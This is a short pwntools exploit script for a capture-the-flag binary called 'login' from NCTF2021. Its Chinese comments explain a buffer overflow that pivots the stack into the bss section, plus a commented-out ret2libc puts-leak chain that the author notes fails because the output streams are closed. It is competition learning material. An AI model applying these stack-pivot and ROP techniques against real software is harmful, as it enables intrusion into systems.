from pwn import *

r = process(r'./login')
elf = ELF(r'./login')
context.log_level = 'debug'
context.arch = 'amd64'

# buf大小0x100，read读取大小0x110 ===> 栈迁移到bss，且只有一个read函数
# vmmap查看bss权限: --->  0x404000   0x405000 rw-p 1000   3000 /home/pwn_ctf/login

bss_addr = 0x404200
leave_ret = 0x40121f
ret_addr = 0x40101a
pop_rbp = 0x40117d
pop_rdi = 0x401293
read_addr = 0x4011ED
close_plt = 0x401090
put_got = elf.got['puts']
put_plt = elf.plt['puts']

# read的mov rsi,[rbp+buf],buf为rbp-0x100，+0x100是为了抵消校准地址
leave_payload = b'A' * 0x100 + p64(bss_addr + 0x100) + p64(read_addr)
r.sendafter(b'NCTF2021!', leave_payload)

# 不过在控制程序流之前程序就先close(1)、close(2)了，输出流被关闭，所以没法泄露puts内存地址，也就没办法打ret2libc
# puts_payload = b'A' * 8 + p64(pop_rdi) + p64(put_got) + p64(put_plt)
# puts_payload += p64(pop_rbp) + p64(bss_addr + 0x300 + 0x100) + p64(read_addr)
# puts_payload = puts_payload.ljust(0x100, b'B')
# puts_payload += p64(bss_addr) + p64(leave_ret)
# r.sendline(puts_payload)

r.interactive()
